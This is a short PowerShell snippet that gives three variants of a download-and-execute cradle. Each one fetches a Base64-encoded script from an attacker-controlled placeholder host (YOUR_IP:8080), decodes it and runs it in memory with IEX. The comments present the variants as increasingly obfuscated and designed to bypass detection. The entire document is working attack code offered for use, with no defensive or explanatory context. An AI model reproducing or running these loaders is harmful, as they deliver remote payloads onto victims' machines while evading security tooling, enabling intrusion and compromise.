# Method 1: Direct Base64 execution (very stealthy)
$url = 'http://YOUR_IP:8080/encoded.txt'
$encoded = (New-Object Net.WebClient).DownloadString($url)
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
IEX $decoded

# Method 2: Even more obfuscated
$e='http://YOUR_IP:8080/encoded.txt';$w=New-Object Net.WebClient;IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($w.DownloadString($e))))

# Method 3: String concatenation to bypass detection
$h='http://';$s='YOUR_IP:8080';$p='/encoded.txt';IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($h+$s+$p))))
